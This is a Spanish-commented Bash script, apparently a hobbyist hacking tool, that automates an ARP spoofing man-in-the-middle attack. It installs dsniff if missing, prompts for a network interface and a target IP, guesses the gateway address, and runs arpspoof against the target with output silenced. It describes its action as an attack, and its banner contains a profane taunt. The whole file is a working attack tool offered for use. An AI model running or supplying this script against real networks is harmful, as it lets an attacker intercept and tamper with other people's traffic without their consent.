#!/bin/bash

# Colores bash

BLUE='\033[34m'
GREEN='\033[32m'
RED='\033[31m'
YELLOW='\033[33m'
GOLD='\033[93m'
RESET='\033[0m'

# Manejar Ctrl+C con un mensaje de salida

trap ctrl_c INT

function ctrl_c() {
    echo -e "\n${RED}[+] Programa cerrado con exito!${RESET}"
    exit 0
}

# Banner

echo -e "${GOLD} · Creado por d1se0${RESET}"

echo -e "\n${BLUE}"
echo "           _.-^^---....,,--"
echo "       _--                  --_"
echo "      <                        >)"
echo "      |                         |"
echo "       \._                   _./"
echo "          '''--. . , ; .--'''"
echo "                | |   |"
echo "             .-=||  | |=-."
echo "             '-=#$%&%$#=-'"
echo "                | ;  :|"
echo "       _____.,-#%&$@%#&#~,._____"
echo "      /_________________________\ "
echo "     /   FUCK YOU HACKER!!!      \ "
echo "    |_____________________________|"
echo -e "${RESET}"

# Función para verificar la instalación de una herramienta

check_herramienta() {
    if ! command -v $1 &>/dev/null; then
        echo -e "${RED}[-] Error: $1 no está instalado.${RESET}"
        echo -e "${YELLOW}[!] Instalando $1 automáticamente...${RESET}"

        # Intentar instalar la herramienta de forma silenciosa
        if sudo apt-get install -y $1 &>/dev/null; then
            echo -e "${GREEN}[+] $1 instalado con éxito.${RESET}"
        else
            echo -e "${RED}[-] Error al instalar $1. Por favor, verifica tu conexión o repositorios.${RESET}"
            exit 1
        fi
    else
        echo -e "${GREEN}[+] $1 ya está instalado.${RESET}"
    fi
}

# Verificar y/o instalar "dsniff"

echo -e "${BLUE}[!] Comprobando dependencias...${RESET}"
check_herramienta "dsniff"
echo -e "${GREEN}[+] Dependencias listas.${RESET}"

# Función para mostrar la barra de progreso con un bucle

progress_bar() {
    local duration=$1
    local bar_length=50
    local progress=0

    echo -n "${YELLOW}[+] Proceso en curso: [${RESET}"
    
    # Bucle que se repite hasta completar el progreso
    while [ $progress -le $bar_length ]; do
        # Calcula el porcentaje de progreso
        local fill=$(printf "%-${progress}s" "#")
        # Muestra la barra de progreso sobrescribiendo la línea
        echo -ne "\r${YELLOW}[+] Proceso en curso: [${RESET}${fill}${RESET}$(printf "%-$((bar_length-progress))s")]"
        # Incrementar el progreso
        ((progress++))
        sleep 0.1  # Ajusta la velocidad de la barra aquí
    done
    echo -e "${GREEN} [+] Presiona Ctrl+C para parar el ataque...${RESET}"
}

# Pedirle al usuario los datos

echo -e "${BLUE}[!] Bienvenido. Por favor, proporciona los siguientes datos:${RESET}"

# Solicitar la interfaz de red

read -p "$(echo -e "${YELLOW}[?] Inserte la interfaz de red que deseas analizar: ${RESET}")" interfaz

# Validación de la interfaz

if [ -z "$interfaz" ]; then
    echo -e "${RED}[-] Error: La interfaz no puede estar vacía. Saliendo...${RESET}"
    exit 1
fi

# Solicitar la IP objetivo

read -p "$(echo -e "${YELLOW}[?] Inserte la IP objetivo: ${RESET}")" ip

# Validación de la IP

if [ -z "$ip" ]; then
    echo -e "${RED}[-] Error: La IP no puede estar vacía. Saliendo...${RESET}"
    exit 1
fi

# Comprobamos si la IP es válida

ping -c 1 "$ip" &>/dev/null
if [ $? -ne 0 ]; then
    echo -e "${RED}[-] No se pudo encontrar la IP objetivo $ip. Asegúrese de que la IP esté activa.${RESET}"
    exit 1
else
    echo -e "${GREEN}[+] IP objetivo $ip encontrada y activa.${RESET}"
fi

# Calcular la puerta de enlace

puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')

# Mostrar la barra de progreso

progress_bar 5 # Duración en segundos

# Ejecutar arpspoof y redirigir su salida a /dev/null

echo -e "${GREEN}[+] Iniciando ARP Spoofing en la interfaz $interfaz hacia la IP objetivo $ip, con la puerta de enlace $puerta_enlace...${RESET}"
arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace" &>/dev/null
echo -e "${RESET}"
